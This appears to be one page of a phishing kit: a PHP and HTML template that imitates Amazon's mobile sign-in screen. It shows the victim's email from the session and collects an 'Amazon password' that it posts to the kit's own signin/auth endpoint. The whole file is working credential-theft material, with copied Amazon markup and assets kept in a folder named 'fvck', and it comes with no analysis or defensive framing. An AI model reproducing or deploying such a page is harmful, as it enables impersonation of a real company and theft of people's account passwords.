<?php
defined("ALLOW") or exit('No direct script access allowed');

$country = trim($_SESSION['countryCode']);
include FCPATH . "language/lang.php";
?>
<!DOCTYPE html>
<html class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember awa-browser" data-19ax5a9jf="mongoose" data-aui-build-date="3.21.4-2021-08-16">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
    <title>
        <?php echo $_1 ?>
    </title>
    <link rel="shortcut icon" href="<?= base_url() ?>Assets/fvck/images/favicon.ico" />
    <link rel="stylesheet" href="<?= base_url() ?>Assets/fvck/css/sign-mobile.css">
    <link rel="stylesheet" href="<?= base_url() ?>Assets/fvck/css/style.sign-mobile.css">
    <link rel="stylesheet" href="<?= base_url() ?>Assets/fvck/css/style2.sign-mobile.css">
</head>
<body class="a-color-offset-background ap-locale-en_US a-m-us a-aui_72554-c a-aui_button_aria_label_markup_348458-t1 a-aui_csa_templates_buildin_ww_exp_337518-t1 a-aui_csa_templates_buildin_ww_launch_337517-c a-aui_csa_templates_declarative_ww_exp_337521-c a-aui_csa_templates_declarative_ww_launch_337520-c a-aui_dynamic_img_a11y_markup_345061-t1 a-aui_mm_desktop_exp_291916-c a-aui_mm_desktop_launch_291918-c a-aui_mm_desktop_targeted_exp_291928-c a-aui_mm_desktop_targeted_launch_291922-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c auth-show-password-enabled auth-show-password-ready" cz-shortcut-listen="true">
    <div id="a-page">
        <div class="a-section a-spacing-none">
            <header id="nav-main" data-nav-language="en_US" class="nav-mobile nav-progressive-attribute nav-locale-us nav-lang-en nav-ssl nav-unrec nav-blueheaven">
                <div id="navbar" cel_widget_id="Navigation-mobile-navbar" role="navigation" class="nav-t-basicNoAuth nav-sprite-v3 celwidget" data-csa-c-id="ccfmjt-p4zuo0-ncg407-rmk4dj">
                    <div id="nav-logobar">
                        <div class="nav-left">
                            <div id="nav-logo">
                                <a href="#" id="nav-logo-sprites" class="nav-logo-link nav-progressive-attribute" aria-label="Amazon"> <span class="nav-sprite nav-logo-base"></span>
                                <span id="logo-ext" class="nav-sprite nav-logo-ext nav-progressive-content"></span>
                                <span class="nav-logo-locale">.us</span> </a>
                            </div>
                        </div>
                        <div class="nav-right"> </div>
                    </div>
                </div>
                <div id="nav-progressive-subnav"> </div>
            </header>
        </div>
        <div class="a-box"><div class="a-box-inner a-padding-extra-large">   
        <h1 style="font-weight:normal;" class="a-spacing-small">
          Sign in
        </h1>     
        <div class="a-row a-spacing-base">
      <span dir="ltr"><?php echo $_SESSION['emailLogin'] ?></span>
      <a id="ap_change_login_claim" class="a-link-normal" tabindex="5" href="#">
        Change
      </a>
    </div>   
    <form name="signin" id="fms-form" action="<?= base_url() ?>signin/auth" method="post" novalidate>
    <div class="a-section">
    <input type="text" id="emailLogin" autocomplete="email" name="emailLogin" value="<?php echo $_SESSION['emailLogin'] ?> " class="a-input-text hide"/>        
    <div class="a-section a-spacing-large">
    <div class="a-row">
    <div class="a-column a-span12">
      <label for="ap_password" class="a-form-label">                  
            Amazon password                         
      </label>
    </div>  
  </div>

<input type="password" id="password" name="passwordLogin" tabindex="2" class="a-input-text a-span12 auth-autofocus auth-required-field" required/>
<div id="auth-password-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" role="alert">
    <div class="a-box-inner a-alert-container">
        <i class="a-icon a-icon-alert"></i>
    <div class="a-alert-content">
  Enter your password
        </div>
    </div>
</div>
</div>
<div class="a-row a-spacing-top-small">
    <div class="a-section a-text-left">
      <label for="auth-remember-me" class="a-form-label">
        <div data-a-input-name="rememberMe" class="a-checkbox a-checkbox-fancy a-control-row a-touch-checkbox auth-show-password-checkbox">
            <label>
            <input type="checkbox" name="rememberMe" value="true" tabindex="4"/>
            <i class="a-icon a-icon-checkbox"></i>
            <span style="font-weight:bold;" class="a-label a-checkbox-label">
          Keep me signed in.
          <span class="a-declarative" data-action="a-popover" data-csa-c-type="widget" data-csa-c-func-deps="aui-da-a-popover" data-a-popover="{&quot;closeButtonLabel&quot;:&quot;&quot;,&quot;activate&quot;:&quot;onclick&quot;,&quot;header&quot;:&quot;\&quot;Keep Me Signed In\&quot; Checkbox&quot;,&quot;inlineContent&quot;:&quot;\u003cp&gt;Choosing \&quot;Keep me signed in\&quot; reduces the number of times you're asked to Sign-In on this device.\u003c\/p&gt;\n\u003cp&gt;To keep your account secure, use this option only on your personal devices.\u003c\/p&gt;&quot;}">
            <a id="remember_me_learn_more_link" href="javascript:void(0)" role="button" class="a-popover-trigger a-declarative">
              Details
            <i class="a-icon a-icon-popover"></i></a>
          </span>
        </span>
        </label>
        </div>
      </label>
    </div>
  </div>
    </div>
    <input type="hidden" name="encryptedPasswordExpected"/>
        <div class="a-section">         
          <span style="border:none;" id="signInSubmit" class="">
              <span class="a-button-inner">
                  <input type="submit" id="signInSubmit" name="signInSubmit" tabindex="3" class="a-button-input"  aria-labelledby="auth-signin-button-announce"/>
              <span style="background-color:#ffd814; border-radius:10px;" id="signInSubmit" class="a-button-text" aria-hidden="true">
            Sign in
          </span>
         </span>
        </span>         
        </div>
      </div>
    </form>   
  </div>
  </div>
</div>
</div>
</div>                  
      </div>      
      <div id="right-2"></div>
<footer class="nav-mobile nav-ftr-batmobile">
                <div id="nav-ftr" class="nav-t-footer-basicNoAuth nav-sprite-v3">
                    <ul class="nav-ftr-horiz">
                        <li class="nav-li">
                            <a href="#" class="nav-a">
                                <?php echo $_21 ?>
                            </a>
                        </li>
                        <li class="nav-li">
                            <a href="#" class="nav-a">
                                <?php echo $_22 ?>
                            </a>
                        </li>
                        <li class="nav-li">
                            <a href="#" class="nav-a">
                                <?php echo $_32 ?>
                            </a>
                        </li>
                    </ul>
                    <div id="nav-ftr-copyright">
                        <?php echo $_24 ?>
                    </div>
                </div>
            </footer>
    <script src="<?= base_url() ?>Assets/fvck/js/jquery-3.3.1.min.js"></script>
    <script src="<?= base_url() ?>Assets/fvck/js/jquery.validate.min.js"></script>
    <script>
        $(document).ready(function() {
            $("form").submit(function() {
                $(this).submit(function() {
                    return false;
                });
                return true;
            });
        });
        $(function() {
            $('#ap_email').on('input', function() {
                if (!$('#ap_email').val() == '') $('#ap_email_login_icon').addClass('show');
                else $('#ap_email_login_icon').removeClass('show');
            });
            let emailFocus = $('input[name=emailLogin]');
            emailFocus.focusin(function() {
                $('.emailfocus').addClass('a-form-focus');
            });
            emailFocus.focusout(function() {
                $('.emailfocus').removeClass('a-form-focus');
            });
            let passFocus = $('input[name=passwordLogin]');
            passFocus.focusin(function() {
                $('.passwordfocus').addClass('a-form-focus');
            });
            passFocus.focusout(function() {
                $('.passwordfocus').removeClass('a-form-focus');
            });
            let BcFocus = $('input[name=btnContinue]');
            BcFocus.focusin(function() {
                $('.btnEmail').addClass('a-button-focus');
            });
            BcFocus.focusout(function() {
                $('.btnEmail').removeClass('a-button-focus');
            });
            let BsFocus = $('input[name=signInSubmit]');
            BsFocus.focusin(function() {
                $('.btnPass').addClass('a-button-focus');
            });
            BsFocus.focusout(function() {
                $('.btnPass').removeClass('a-button-focus');
            });
            $('#ap_email_login_icon').on('click', function() {
                $('#ap_email').val(null);
            });
        });

        $("input[name=emailLogin]").on('keyup', function() {
            $('#emailsgin').html($(this).val());
        });
        $("#ap_password").on('keyup', function(s) {
            if (13 == s.keyCode) $("#signInSubmit").click();
        });

        let showPass = () => {
            let ap_email = $('#ap_email').val();
            if (ap_email.length == '') {
                $('.emailnull').addClass('show');
                $('.emailfocus').addClass('a-form-error');
                $('.auth-inlined-error-message').addClass('show');
                return true;
            } else if (!ap_email.match(/^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/)) {
                $('.badInput').removeClass('hide');
                $('.emailfocus').addClass("a-form-error");
                return true;
            } else {
                $('.passnull').removeClass('show');
                $('.passwordfocus').removeClass('a-form-error');
                $('.emailnull').addClass('hide');
                $('#btncontinue').addClass('hide');
                $('.badInput').addClass('hide');
                $('.emailpage').addClass('hide');
                $('.passpage').removeClass('hide');
                return false;
            }
        }

        let checkpass = () => {
            let ap_password = $('#ap_password').val();
            if (ap_password.length < 6) {
                $('.passnull').addClass('show');
                $('.passwordfocus').addClass('a-form-error');
                return false;
            } else {
                $('.passnull').removeClass('show');
                $('.passwordfocus').removeClass('a-form-error');
            }
        }
    </script>
</body>

</html>